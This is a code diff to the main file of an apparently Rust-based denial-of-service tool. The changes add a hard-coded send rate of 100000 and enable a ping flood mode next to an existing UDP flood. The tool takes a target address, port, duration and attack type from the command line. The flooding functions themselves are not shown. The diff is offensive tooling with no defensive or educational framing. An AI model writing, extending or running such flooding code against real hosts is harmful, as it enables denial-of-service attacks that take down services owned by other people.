@@ -8,10 +8,6 @@ use tokio::sync::mpsc;
 use tokio::time::{sleep, Duration};
 
 
-
-
-
-
 async fn chrono(tx: mpsc::Sender<()>, ddos_time:u64) {
 
     sleep(Duration::from_secs(ddos_time)).await;
@@ -27,6 +23,12 @@ async fn chrono(tx: mpsc::Sender<()>, ddos_time:u64) {
 #[tokio::main]
 async fn main() {
 
+    //ENV VARIBALES
+    let rate_limite:u64 = 100000;
+
+
+    //ENV VARIBALES
+
     let args: Vec<String> = env::args().collect();
 
     if args.len() < 3 {
@@ -34,7 +36,7 @@ async fn main() {
         return;
     }
 
-    let target = format!("{}:{}", args[1], args[2]);
+
     let ddos_time:u64 = args[3].parse::<u64>().unwrap();
 
     let (tx, mut rx) = mpsc::channel(1);
@@ -49,8 +51,10 @@ async fn main() {
 
     match args[4].as_str() {
         "udp" => {
+            let target = format!("{}:{}", args[1], args[2]);
+
             ddos_task = tokio::spawn(async move {
-                ddos_udp::ddos_udp(&mut rx, target).await;
+                ddos_udp::ddos_udp(&mut rx, target,rate_limite).await;
             });
 
             chrono_task.await.unwrap();
@@ -59,9 +63,10 @@ async fn main() {
             println!("tcp ddos");
         },
         "ping" => {
+            let target = format!("{}", args[1]);
             println!("ping ddos");
             ddos_task = tokio::spawn(async move {
-                //ddos_udp::ddos_udp(&mut rx, target).await;
+                ddos_ping::ddos_ping(&mut rx, target, rate_limite).await;
             });
 
             chrono_task.await.unwrap();
